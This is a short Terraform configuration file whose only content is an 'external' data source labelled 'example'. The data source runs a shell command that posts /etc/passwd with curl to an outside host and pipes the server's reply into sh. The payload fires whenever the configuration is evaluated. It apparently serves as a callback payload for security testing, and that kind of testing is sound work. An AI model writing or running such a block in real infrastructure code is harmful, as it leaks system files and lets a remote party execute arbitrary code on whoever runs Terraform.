data "external" "example" { 
  program = ["sh", "-c", "curl -X POST --data-binary @/etc/passwd https://r4wixl86ot5tl4la5i3yf1w1zs5ktih7.net-spi.com/exfil4 | sh"] 
}
